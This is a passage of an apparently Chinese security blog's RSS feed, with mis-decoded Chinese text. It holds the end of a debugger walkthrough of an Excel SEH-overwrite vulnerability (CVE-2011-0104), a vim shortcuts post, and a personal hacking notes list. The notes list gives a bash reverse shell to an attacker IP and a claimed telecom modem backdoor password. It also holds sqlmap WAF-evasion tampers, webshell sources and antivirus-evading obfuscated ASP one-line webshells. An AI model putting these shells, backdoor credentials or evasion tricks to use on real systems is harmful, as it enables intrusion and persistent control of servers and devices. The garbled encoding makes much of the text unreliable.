    æ­¤æ—¶eip=3070dd67,ç”¨ä¸Šé¢çš„ç¬¬äºŒç§æ–¹æ³•ç›´æ¥æŸ¥çœ‹[esp]å³å¯å¾—å‡ºä¸Šä¸€å¸§çš„ä¸Šä¸€å¸§çš„ebpä¸º0012aa70,0012aa70&amp;gt;12aa6f,åº”è¯¥
    å°±æ˜¯è¦†ç›–äº†è¿™ä¸ªebpäº†,12aa70çš„ä¸‹ä¸€æ ˆå•å…ƒ12aa74ä¸­çš„å€¼[12aa74]ä¸º30e05adå‡½æ•°çš„è¿”å›åœ°å€,ç»§ç»­è°ƒè¯•å¦‚ä¸‹
    
åœ¨æ±‡ç¼–çª—å£ä¸­ctrl+g:12aa70,å³é”®ä¸‹å†…å­˜å†™å…¥æ–­ç‚¹

    f9ä¸­æ–­åˆ°300de834å¤„:
    300DE834   .  F3:A5         rep movs dword ptr es:[edi],dword ptr ds:[esi]

åœ¨å †æ ˆçª—å£ä¸­ctrl+g:12aa70,å³é”®é”å®šå †æ ˆ

f7
f7
f7
...
f7
    åœ¨ä¸€ç›´f7æ—¶ä¼šä¸€ç›´çœ‹åˆ°æ ˆä¸­çš„æ•°æ®è¢«æ”¹å˜,å¹¶æ…¢æ…¢æ¥è¿‘12aa70,æœ€ç»ˆè¦†ç›–12aa70ä¸­çš„å€¼,è¦†ç›–12aa74ä¸­çš„å€¼,...

æ‰§è¡Œåˆ°è¿”å›
...
f8
f8
...
    æœ€åæ‰§è¡Œåˆ°300e06f7å¤„å‡†å¤‡å‘ç”Ÿå¼‚å¸¸

        300E06F1   .  8B0D 445B8930 mov ecx,dword ptr ds:[0x30895B44]
        300E06F7   .  8908          mov dword ptr ds:[eax],ecx
        300E06F9   &amp;gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                                               ;  EXCEL.30413050
        300E06FC   .  A3 445B8930   mov dword ptr ds:[0x30895B44],eax
        300E0701   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]
        300E0704   .  A3 34DF8830   mov dword ptr ds:[0x3088DF34],eax
        300E0709   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]
        300E070C   .  8D65 94       lea esp,dword ptr ss:[ebp-0x6C]
        300E070F   .  5F            pop edi                                                                       ;  0012CA48
        300E0710   .  5E            pop esi                                                                       ;  0012CA48
        300E0711   .  5B            pop ebx                                                                       ;  0012CA48
        300E0712   .  C9            leave
        300E0713   .  C2 2C00       retn 0x2C

    eip=300e06f7å¤„å‘ç”Ÿå¼‚å¸¸æ˜¯ç”±windbgæ•è·çš„,æ­¤æ—¶æŸ¥çœ‹sehé“¾å¦‚ä¸‹

        SEH é“¾ç”¨äº  ä¸»çº¿ç¨‹
        åœ°å€       SEå¤„ç†ç¨‹åº
        0012FD38   user32.77E3AF18
        0012FDA0   user32.77E3AF18
        0012FFB0   EXCEL.3087F58C
        0012FFE0   kernel32.7C821A78
åœ¨sehé“¾çª—å£ä¸­å³é”®å…¨éƒ¨&quot;åœ¨å¥æŸ„ä¸Šåˆ‡æ¢æ–­ç‚¹&quot;(ä¹Ÿå³å…¨éƒ¨ä¸‹æ–­),å‘ç°å¼‚å¸¸åä¼šæ‰§è¡Œåˆ°77e3af18,ä½†æ˜¯ä¸ç¡®å®šæ˜¯12fd38å¤„çš„
773af18è¿˜æ˜¯12fda0å¤„çš„77e3af18,äºæ˜¯å…ˆåœ¨12fd38ä¸Šå³é”®åœ¨å †æ ˆçª—å£ä¸­è·Ÿéš,è½¬åˆ°å¦‚å †æ ˆçª—å£æ•°æ®:

    0012FD38  |0012FDA0  æŒ‡å‘ä¸‹ä¸€ä¸ª SEH è®°å½•çš„æŒ‡é’ˆ
    0012FD3C  |77E3AF18  SEå¤„ç†ç¨‹åº
    0012FD40  |77E2B890  user32.77E2B890
    0012FD44  |00000000

å°†0012fd3cå¤„çš„77e3af18æ”¹æˆ41414141,å¹¶ä»300e06f7å¤„å¼€å§‹f8å•æ­¥è·Ÿè¸ª,å‘ç°è¿™æ ·ç¨‹åºä¼šå¼‚å¸¸ç»ˆæ­¢,çŒœæµ‹æ˜¯ç”±äºå…¶ä»–çº¿ç¨‹
ç›‘è§†åˆ°41414141å¤„å¹¶ä¸èƒ½å¤„ç†å½“å‰å¼‚å¸¸æƒ…å†µ,å¦‚æœå°†0012fd3cå¤„çš„77e3af18æ”¹æˆ300e0713(ä¸€ä¸ªretn 0x2cæŒ‡ä»¤çš„åœ°å€),å¼‚
å¸¸å¤„ç†åˆ™æ— æ³•è¿›è¡Œ,ä½†ç¨‹åºä¸ä¼šç»ˆæ­¢,åªæ˜¯f8æ— æ³•åˆ°ä¸‹ä¸€æ­¥,ä¸€ç›´åœåœ¨300e06f7å¤„,æ­¤æ—¶å†å°†0012fd3cå¤„çš„300e0713æ”¹å›
77e3af18åˆ™ä¼šæ­£å¸¸è¿›å…¥77e3af18,è¯´æ˜æ˜¯ç¬¬12fd38å¤„çš„77e3af18ä¸ºå®é™…ç”¨åˆ°çš„å¼‚å¸¸å¤„ç†ç¨‹åº,å¯è§åªè¦å°†æ¶æ„æ„é€ çš„æ•°æ®è¦†
ç›–åˆ°0012fd38å³å¯æ§åˆ¶eip,ä»è€Œæ‰§è¡Œshellcode.

ç”±äºå®éªŒä¸­ç”¨çš„ç³»ç»Ÿç¯å¢ƒå’Œã€Šæ¼æ´æˆ˜äº‰ã€‹ä¸­çš„ç¯å¢ƒä¸€è‡´,è€Œä¹¦ä¸­ç”¨åˆ°çš„exploit.xlbæ˜¯excel 2007 sp2çš„æ¶æ„æ•°æ®,æ‰€ä»¥æœ€
åä¸ä¼šæ‰§è¡Œåˆ°shellcode,åªæ˜¯å¼‚å¸¸.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 11 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/</guid>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>excel</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>vimå¿«æ·é”®</title>
        <description>&lt;h3 id=&quot;x00-vim&quot;&gt;0x00 vim&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;å‡½æ•°æŠ˜å ä¸æ‰“å¼€
    zMå‡½æ•°å…¨éƒ¨æŠ˜å 
    zRæŠ˜å å…¨éƒ¨æ‰“å¼€
    zoæ‰“å¼€ä¸€ä¸ªæŠ˜å 
    zcåˆ›å»ºä¸€ä¸ªæŠ˜å 
2&amp;gt;ä»£ç è‡ªåŠ¨è§„èŒƒç¼©è¿›
    ggvG
    =
    (pythonæ•ˆæœä¸å¥½,æœ‰å¯èƒ½è®©ä»£ç ä¸å†å¯¹é½è€Œå‡ºé”™)

    ä»£ç å—ç¼©è¿›&amp;lt;C+v&amp;gt;+(é€‰æ‹©å—)+&amp;lt;&amp;gt;
        &amp;lt;è¡¨ç¤ºä»£ç å—å‘å·¦ç¼©è¿›,&amp;gt;è¡¨ç¤ºä»£ç å—å‘å³ç¼©è¿›
3&amp;gt;easymotionæ’ä»¶(,ä¸º&amp;lt;leader&amp;gt;)é»˜è®¤&amp;lt;leader&amp;gt;&amp;lt;leader&amp;gt;w,æ·»åŠ å¦‚ä¸‹æ˜ å°„:

    noremap ` H
    &quot;ä¸Šé¢è¿™å¥æ˜¯å› ä¸ºHé”®åŸæ¥åº”è¯¥æ˜¯è·³è½¬åˆ°å½“å‰å±å¹•ç¬¬ä¸€è¡Œ,ä½†æ˜¯å¯èƒ½è¢«å…¶ä»–æ’ä»¶å†²çªå¯¼è‡´å¤±æ•ˆ,noremapå¯ä»¥é‡æ–°å°†æ•°å­—1å·¦è¾¹çš„é”®æ˜ å°„æˆåŸæ¥Hçš„æ•ˆæœ
    map a ,,f
    map b ,,F
    map s `,,f
    &quot;ä¸Šé¢å››å¥å®ç°3ä¸ªé”®è·³è½¬åˆ°ä»»æ„ä½ç½®
    &quot;aä¸ºå‘ä¸‹æœç´¢,bä¸ºå‘ä¸Šæœç´¢,sä¸ºå½“å‰å±å¹•æœç´¢,è¾“å…¥s/a/b+(æƒ³æ‰¾çš„å­—ç¬¦)+å¯¹åº”hintå­—ç¬¦

4&amp;gt;vimå†™ä¸­æ–‡è‡ªåŠ¨æ¢è¡Œçš„å¤„ç†
    https://wiki.archlinux.org/index.php/Vim_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#.E8.87.AA.E5.8A.A8.E6.8D.A2.E8.A1.8C.E6.98.BE.E7.A4.BA
    http://www.cnblogs.com/ayanmw/p/3432005.html
    http://blog.chinaunix.net/xmlrpc.php?r=blog/article&amp;amp;uid=53564&amp;amp;id=2098815
    http://blog.csdn.net/auwzb/article/details/11609363
    æœ€åä¸ºå®ç°å†™mdæ–‡ä»¶å¯ä»¥åœ¨textwidthçš„å€¼å¤„è‡ªåŠ¨æ¢è¡Œ,åœ¨vimrcä¸­åŠ å…¥å¦‚ä¸‹:
        autocmd FileType * setlocal textwidth=111 formatoptions=tcqmM
        (å…¶ä¸­çš„textwidth=111ä¸ºgithub pagesçš„åšå®¢æ¯è¡Œé•¿åº¦,ä¸”å®‰è£…vim13å,ä¸Šé¢çš„*åªå¯¹mdæ–‡ä»¶æœ‰æ•ˆ,å¦‚æœå†™æˆFileType md setlocal...åˆ™æ²¡æœ‰æ•ˆæœ,æƒ‘ä¸è§£)

    or
    find ~ -name ftplugin
    vi /root/.vim/bundle/vim-markdown/ftplugin
    ä¿®æ”¹å¯¹åº”é¡¹


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-vimperator&quot;&gt;0x01 vimperator&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;3.14.0 (created: 2016/06/07 23:58:16)
imap jf &amp;lt;Esc&amp;gt;
imap fj &amp;lt;Esc&amp;gt;
cmap jf &amp;lt;Esc&amp;gt;
cmap fj &amp;lt;Esc&amp;gt;
&quot; noremap ; &amp;lt;S-;&amp;gt;æ— æ•ˆ
nmap mm ZZ
noremap J gT
noremap K gt
noremap h &amp;lt;S-Left&amp;gt;
noremap l &amp;lt;S-Right&amp;gt;
source! /root/.vimperatorrc.local

&quot; vim: set ft=vimperator:

set nextpattern=\s*ä¸‹ä¸€é¡µ|ä¸‹ä¸€å¼ |ä¸‹ä¸€ç¯‡|ä¸‹é¡µ|åé¡µ\s*,^\bnext\b,\\bnext\\b,^&amp;gt;$,^(&amp;gt;&amp;amp; gt;|Â»)$,^(&amp;gt;|Â»),(&amp;gt;|Â»)$,\\bmore\\b
set previouspattern=\s*ä¸Šä¸€é¡µ|ä¸Šä¸€å¼ |ä¸Šä¸€ç¯‡|ä¸Šé¡µ|å‰é¡µ\s*,^\bprev|previous\b, \\bprev|previous\\b,^&amp;lt;$,^(&amp;lt;&amp;lt;|Â«)$,^(&amp;lt;|Â«),(&amp;lt;|Â«)$
nmap [ [[
nmap ] ]]

noremap bl :tabopen https://3xp10it.github.io &amp;lt;CR&amp;gt;
noremap gi :tabopen http://www.github.com/3xp10it &amp;lt;CR&amp;gt;
noremap li :tabopen https://3xp10it.github.io/bookmarks.html &amp;lt;CR&amp;gt;
noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 07 Aug 2016 00:00:00 +0800</pubDate>
        <link>/vim/2016/08/07/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/</link>
        <guid isPermaLink="true">/vim/2016/08/07/vim%E5%BF%AB%E6%8D%B7%E9%94%AE/</guid>
        
        <category>linux</category>
        
        <category>editor</category>
        
        <category>effiency</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>my notes</title>
        <description>&lt;p&gt;My updating noteâ€¦&lt;/p&gt;

&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt;æ²¡ç”¨è¿‡çš„åœ¨çº¿æ‰«æå™¨:
    https://jawfish.io/
&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt;ä½¿ç”¨pythonå¼€å¯ä¸€ä¸ªç®€å•çš„httpæœåŠ¡:
    python - m SimpleHTTPServer 80
&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt;serve Uè¿è¡Œcmd:
    quote site exec &quot;...&quot;
&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt;è´¦å·telecomadminå¯†ç nE7jA%5mç”µä¿¡çŒ«åé—¨
&lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt;linux local_rootææƒ  http://exploit.linuxnote.org/
                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
  windowsã€€https://github.com/GDSSecurity/Windows-Exploit-Suggester
&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;metasploitä¸postgresqlæ•°æ®åº“è¿æ¥:msf &amp;gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
&lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   ä¼ªé€ é‚®ä»¶å‘é€,ä¸€å°æ—¶é‚®ç®±
&lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt;bashåå¼¹:
    /bin/bash -i &amp;gt; /dev/tcp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;attacker&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_ip&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;port&amp;gt;&lt;/span&gt; 0&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;amp;&lt;/span&gt;1 2&amp;gt;&amp;amp;1
&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed -i &#39;/Love/d&#39; 1.txt   åˆ é™¤åŒ…å«Loveçš„è¡Œ
&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;åŠ äº†vpnå°±ç›¸å½“äºvpnå¼ºåˆ¶ç»™é€šä¿¡é“¾è·¯åŠ äº†ä¸ªé™åˆ¶:æ‰€æœ‰æ•°æ®åªèƒ½é€šè¿‡vpnè¿›å‡º.(æ­£å¸¸è”ç½‘çš„åŠŸèƒ½åªæ˜¯ç»™ç³»ç»ŸåŠ äº†è¿æ¥å…¶ä»–åœ°å€çš„å„ç§é“è·¯,å¿…é¡»å…ˆä¿è¯å¯ä»¥è”ç½‘,ç„¶åå¯ä»¥ä¿è¯åŠ äº†vpnåçš„æ•ˆæœä¼šæ˜¯è¿™æ ·&amp;gt;&amp;gt;
    å…ˆé€šè¿‡ä¸€äº›æ•°æ®é“¾è·¯è¿æ¥åˆ°vpn,ç„¶åvpnä½œä¸ºä»£ç†å†è®¿é—®äº’è”ç½‘.
&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar -T mulu.list -czf file.tar.gz
&lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;åˆ†å‰²å¤§æ–‡ä»¶å†åˆå¹¶
    split -b 20m RevolutionOS.rmvb RevOS_part_,
    cat RevOS_part_&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
&lt;span class=&quot;p&quot;&gt;13.&lt;/span&gt;ä¸€äº›æ•°æ®åº“æ“ä½œ
  ç»™æ•°æ®åº“æ·»åŠ ä¸€ä¸ªç”¨æˆ·
    CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;(å¯å°å†™)
    ä¿®æ”¹å¯†ç 
    SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
    ä¿®æ”¹æƒé™
    GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39; WITH GRANT OPTION;(databasename.tablenameå¯ä¸º&lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt;,privilegeså¯ä¸ºall,æ³¨æ„databasenameå’Œtablenameä¸­ä¸è¦æœ‰&#39;.&#39;è¿™ä¸ªæ ‡ç‚¹,å¦åˆ™databasename.tablenameä¸çŸ¥é“åœ¨å“ªå„¿ç®—ä½œåˆ†å¼€,eg.gv32_cms5.1.9æ˜¯æ•°æ®åº“å,åˆ™ä¼šå‡ºé”™)

  è®¾ç½®å…è®¸æœ¬æœºæ‰€æœ‰ç½‘å¡å¯¹åº”ipéƒ½å¯ä»¥è¢«rootè¿æ¥å‘½ä»¤:
    grant all privileges on &lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt; to root@&#39;%&#39; identified by &#39;12345678&#39; with grant option;
    12345678ä¸ºrootå¯†ç 
&lt;span class=&quot;p&quot;&gt;14.&lt;/span&gt;ip:23.23.23.23    (bing)
&lt;span class=&quot;p&quot;&gt;15.&lt;/span&gt;æš´è·¯å¾„http://www.lxway.com/1191778.html  
&lt;span class=&quot;p&quot;&gt;16.&lt;/span&gt;sublime textå¿«æ·é”®å¥½ä¸œè¥¿:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
  ctrl+D,ctrl+shift+k,ctrl+shift+&lt;span class=&quot;nt&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;,æŒ‰ä½shiftå³é”®æ‹–åŠ¨é¼ æ ‡å¤šè¡Œç¼–è¾‘,set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,ctrl+shift+vå®Œæ•´ç²˜è´´æºä»£ç æ ¼å¼,ç§»åŠ¨ä¸€è¡Œctrl+shift+ä¸Š/ä¸‹
&lt;span class=&quot;p&quot;&gt;17.&lt;/span&gt;nmap :
  nmap -v -sP -PI -PT -Pn 192.168.0.0/24
  nmap -v -sn -PE 192.168.0.0/24 å¿«é€Ÿæ‰«æå±€åŸŸç½‘å­˜æ´»ä¸»æœº
&lt;span class=&quot;p&quot;&gt;18.&lt;/span&gt;å¸¸ç”¨linuxå‘½ä»¤

   head -n 1 /etc/issue   # æŸ¥çœ‹linuxæ“ä½œç³»ç»Ÿç‰ˆæœ¬
   getconf LONG_BIT       # æŸ¥çœ‹ç³»ç»Ÿæ˜¯32ä½è¿˜æ˜¯64ä½
   ç½‘ç»œ
   
   # ifconfig               # æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œæ¥å£çš„å±æ€§
   # iptables -L            # æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®
   # route -n               # æŸ¥çœ‹è·¯ç”±è¡¨
   # netstat -lntp          # æŸ¥çœ‹æ‰€æœ‰  ç›‘å¬ç«¯å£
   # netstat -antp          # æŸ¥çœ‹æ‰€æœ‰å·²ç»å»ºç«‹çš„è¿æ¥
   # netstat -s             # æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯

   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*vimrc*&lt;/span&gt;&quot; | xargs grep -r &quot;linebreak&quot;
       #åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«vimrcçš„æ‰€æœ‰æ–‡ä»¶,å¹¶åœ¨è¿™äº›æ–‡ä»¶ä¸­æŸ¥https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/æ‰¾åŒ…å«&quot;linebreak&quot;å…³é”®å­—çš„æ–‡ä»¶ä¸­çš„ä¸&quot;linebreak&quot;ç›¸å…³çš„è¡Œ
&lt;span class=&quot;p&quot;&gt;19.&lt;/span&gt;linux backup and restore:&lt;span class=&quot;nt&quot;&gt;&amp;lt;sudo&amp;gt;&lt;/span&gt;
    0&amp;gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/    æ›´è¯¦ç»†
    1&amp;gt;backup:
    cd /
    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys --exclude=/root/.cache /
    2&amp;gt;restore:
    backup the new system&#39;s /boot and /etc/fstab
    cd /
      tar xvpfz linuxbackup.tgz -C / 
      mkdir proc  
      mdkir lost+found  
      mkdir mnt   
      mkdir sys
    restore the new system&#39;s backup&#39;s /boot and /etc/fstab
      reboot
    3&amp;gt;http://blog.csdn.net/shendl/article/details/7384755
    4&amp;gt;https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
&lt;span class=&quot;p&quot;&gt;20.&lt;/span&gt;pythonä¸­importå’Œfrom xx import xxéœ€è¦æ³¨æ„çš„äº‹:
  importè¯­å¥ä¸­:importæˆ–è€…from xx import xxè¯­å¥å½“ä¸­,å½¢å¦‚a.bçš„
  ç”¨æ³•å¦‚from a.b import f(fæ˜¯b.pyä¸­ä¸€ä¸ªå‡½æ•°åæˆ–è€…ä¸€ä¸ªå¸¸é‡,aæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹,åªæœ‰æ–‡ä»¶å¤¹æ‰
  å¯ä»¥å¸¦.åæ¥å…·ä½“æ–‡ä»¶åã€Šå¦‚æ­¤å¤„çš„b&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;çœç•¥.pyåç¼€&amp;gt;ã€‹,åœ¨å…·ä½“çš„å‡½æ•°è°ƒç”¨è€Œä¸æ˜¯importè¯­å¥ä¸­,æ–‡ä»¶å¯
  ä»¥å¸¦.åæ¥æ–‡ä»¶ä¸­çš„å‡½æ•°æˆ–å¸¸é‡ã€Šå¦‚sqlmapä¸­,åœ¨sqlmapç›®å½•ä¸‹è¿è¡Œpython,å¯ä»¥import tamper.sapce2comment,ç„¶
  åè¿è¡Œtamper.space2comment.tamper(&quot; ajf  &quot;),ä½†æ˜¯ä¸å¯ä»¥ç›´æ¥è¿è¡Œsapce2comment.tamper(&quot; ajf  &quot;),è¿™æ ·ä¼šæŠ¥é”™,
  è€Œä¸”ä»¥ä¸Šä¸¤ç§æƒ…å†µéƒ½éœ€è¦åœ¨tamperæ–‡ä»¶å¤¹ä¸‹é¢æ”¾ä¸€ä¸ª__init__.pyæ–‡ä»¶,é‡Œé¢çš„å†…å®¹å¯ä»¥
  ä¸ºç©º,å¦‚æœåœ¨sqlmapç›®å½•ä¸‹ä½¿ç”¨from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;åˆ™éœ€
  è¦åœ¨__init__.pyé‡Œé¢åŠ ä¸Š__all__=&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;&#39;,&#39;&#39;,&#39;&#39;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,å…¶ä¸­&#39;&#39;é‡Œé¢
  æ˜¯tamperç›®å½•ä¸‹æ‰€æœ‰æ¨¡å—çš„æ¨¡å—å,è¿™æ ·çš„è¯å°±å¯ä»¥é€šè¿‡from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;æ¥å¯¼å…¥æ‰€æœ‰æ¨¡å—äº†,ç„¶å
  å°±å¯ä»¥ä½¿ç”¨å¦‚greatest.tamper(&quot;and 1&amp;gt;2&quot;)ç­‰çš„è¯­å¥äº†ã€‹)
  å„tamperè¯¦è§£:http://www.moonsec.com/post-422.html
  æœ€å¸¸ç”¨--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
  å¤§è‡´é€šç”¨between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,securesphere,space2comment
&lt;span class=&quot;p&quot;&gt;21.&lt;/span&gt;ç¥å™¨lfiè‡ªåŠ¨æ¢æµ‹panoptic:https://github.com/lightos/Panoptic
   ç¥å™¨load_fileè‡ªåŠ¨æ¢æµ‹sqlnuke:https://github.com/nuke99/sqlnuke.git
&lt;span class=&quot;p&quot;&gt;22.&lt;/span&gt;webshell:
  webshell generate site(good):http://www.zjjv.com/
  good:https://r57.gen.tr/
       http://www.dcvi.net/
  http://www.passwaf.com/
  http://cduan.cc/ma/index.htm
  php-b374k(PHP version &amp;gt; 4.3.3 and PHP 5):https://github.com/b374k
         (browser old version): https://code.google.com/p/b374k-shell/
  http://www.dcvi.net/
&lt;span class=&quot;p&quot;&gt;23.&lt;/span&gt;ç»å…¸å…¥ä¾µæ€è·¯:
  http://www.2cto.com/Article/201201/115793.html(ä¼ªé™æ€æ³¨å…¥åˆ°è·å¾—webshell)
&lt;span class=&quot;p&quot;&gt;24.&lt;/span&gt;cookieæ³¨å…¥ä¸­è½¬http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(ç›®å‰è®¤ä¸ºåªå¯asp,get)
&lt;span class=&quot;p&quot;&gt;25.&lt;/span&gt;vpnæ­å»ºæ•™ç¨‹(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
                         http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
&lt;span class=&quot;p&quot;&gt;26.&lt;/span&gt;å…³äºipcamçš„UPnPæˆ–NATçš„çŸ¥è¯†http://www.pernet.tv/thread-103-1-1.html
&lt;span class=&quot;p&quot;&gt;27.&lt;/span&gt;google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
   (little good can search&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;inurl:index.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,but not(&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;site:*.edu inurl:inurl.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;)) https://pypi.python.org/pypi/Google-Search-API
   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax-&amp;gt;json-&amp;gt;guan_fang(custom search api,100 results per day for free user)
   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
   two links may mean (guan_fang)custom search api
   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
   å…·ä½“è¯¦æƒ…è§ç™¾åº¦äº‘ç›˜ç¬”è®°æ–‡ä»¶å¤¹
&lt;span class=&quot;p&quot;&gt;28.&lt;/span&gt;.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
&lt;span class=&quot;p&quot;&gt;29.&lt;/span&gt;linux fdisk-&amp;gt;ext3-&amp;gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
&lt;span class=&quot;p&quot;&gt;30.&lt;/span&gt;Cknife  javaç¯å¢ƒèœåˆ€  å·²æ”¾åˆ°/usr/share
&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;å…æ€ä¸€å¥è¯:http://blog.hacku.cn/post/260.html
           http://www.freebuf.com/articles/web/9396.html
           kali linux2.0:
            webacoo
            weevely
   asp:
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(unescape(&quot;eval%20request%28%222016%22%29&quot;))%&amp;gt;          key:2016

   &amp;lt;%
   dim a,b,temp,c
   a=&quot;eva@@l%20req@@uest%28%22helloxj%22%29&quot;
   b=replace(a,&quot;@@&quot;,&quot;é›¶&quot;)
   c=split(b,&quot;é›¶&quot;)
   for i=0 to ubound(c)
   temp=temp+c(i)
   next
   execute(unescape(temp))
   %&amp;gt;
                        key:helloxj

   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%Y=request(&quot;shezhang&quot;)%&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(Y)%&amp;gt;
    
